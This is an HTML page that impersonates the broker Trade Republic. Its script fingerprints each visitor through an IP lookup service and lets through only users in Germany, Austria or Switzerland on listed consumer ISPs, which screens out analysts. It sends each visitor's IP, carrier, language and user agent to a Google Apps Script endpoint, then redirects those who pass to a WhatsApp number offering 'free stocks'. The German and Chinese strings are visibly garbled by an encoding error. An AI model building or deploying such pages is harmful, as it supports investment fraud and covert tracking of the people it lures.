<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Trade Republic - Willkommen</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    #status { font-size: 1.2em; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>üí°Trade Republic hei√üt Sie willkommen</h1>
  <p id="status">√úberpr√ºfung l√§uft...</p>

  <script>
    
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz4qCLwaA_9X9Kk9tIGwY2G3_MCy7ISQXZDpwiNL7-kzecAb1YnP_v_GBq3JQd14arv5g/exec";
    
    const WHATSAPP_LINK = "https://api.whatsapp.com/send/?phone=491639447584&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";

    const ALLOWED_COUNTRIES = ["DE", "AT", "CH"];
    const ALLOWED_ISPS = [
     
      "Deutsche Telekom", "Telekom", "T-Mobile", "Congstar",
      "Vodafone", "Otelo",
      "Telef√≥nica", "O2", "Blau", "ALDI TALK",
      "1&1", "Drillisch", "winSIM", "smartmobil", "PremiumSIM",
      "Freenet", "Klarmobil", "Lidl Connect",
      
      "A1 Telekom", "A1", "Magenta Telekom", "Magenta", "T-Mobile Austria",
      "Drei", "Hutchison Drei", "HoT", "Hofer Telekom",
      "Spusu", "Yesss!", "Educom", "bob", "Liwest", "Lidl Connect",
      
      "Swisscom", "Sunrise", "Salt"
    ];

    const RATE_LIMIT_TIME = 2 * 60 * 1000; 
    const RATE_LIMIT_MAX = 20;
    const RATE_LIMIT_STORAGE_KEY = "visit_timestamps";

    function updateStatus(msg) {
      document.getElementById("status").innerText = msg;
    }

    async function getVisitorInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return {};
      }
    }

    function checkRateLimit() {
      const now = Date.now();
      let visits = JSON.parse(localStorage.getItem(RATE_LIMIT_STORAGE_KEY) || "[]");
      visits = visits.filter(ts => now - ts < RATE_LIMIT_TIME);
      visits.push(now);
      localStorage.setItem(RATE_LIMIT_STORAGE_KEY, JSON.stringify(visits));
      return visits.length > RATE_LIMIT_MAX;
    }

    function isAllowedCountry(country) {
      return ALLOWED_COUNTRIES.includes(country);
    }

    function isAllowedISP(org) {
      if (!org) return false;
      const lowerOrg = org.toLowerCase();
      return ALLOWED_ISPS.some(isp => lowerOrg.includes(isp.toLowerCase()));
    }

    async function logVisit(data) {
      try {
        await fetch(GOOGLE_SCRIPT_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
      } catch (e) {
        console.error("Êó•Âøó‰∏ä‰º†Â§±Ë¥•", e);
      }
    }

    async function main() {
      updateStatus("Daten werden √ºberpr√ºft...");

      const info = await getVisitorInfo();

      const ip = info.ip || "Êú™Áü•";
      const country = info.country || "Êú™Áü•";
      const org = info.org || "Êú™Áü•";
      const language = navigator.language  navigator.userLanguage  "Êú™Áü•";
      const ua = navigator.userAgent || "Êú™Áü•";

      const blockedByRateLimit = checkRateLimit();
      const countryAllowed = isAllowedCountry(country);
      const ispAllowed = isAllowedISP(org);

      let statusText = "";
      let jumpStatus = "Ë∑≥ËΩ¨Â§±Ë¥•";

      if (blockedByRateLimit) {
        statusText = "Zugriffe zu h√§ufig, Zugriff gesperrt.";
      } else if (!countryAllowed) {
        statusText = "Entschuldigung, nur Deutschland, √ñsterreich und Schweiz erlaubt.";
      } else if (!ispAllowed) {
        statusText = "Entschuldigung, Ihr Internetanbieter ist nicht erlaubt.";
      } else {
        statusText = "√úberpr√ºfung erfolgreich, Weiterleitung...";
        jumpStatus = "Ë∑≥ËΩ¨ÊàêÂäü";
      }

      updateStatus(statusText);

      await logVisit({
        timestamp: new Date().toISOString(),
        ip,
        country,
        carrier: org,
        language,
        device: ua,
        status: jumpStatus
      });

      if (jumpStatus === "Ë∑≥ËΩ¨ÊàêÂäü") {
        setTimeout(() => {
          window.location.href = WHATSAPP_LINK;
        }, 1500);
      }
    }

    main();
  </script>
</body>
</html>
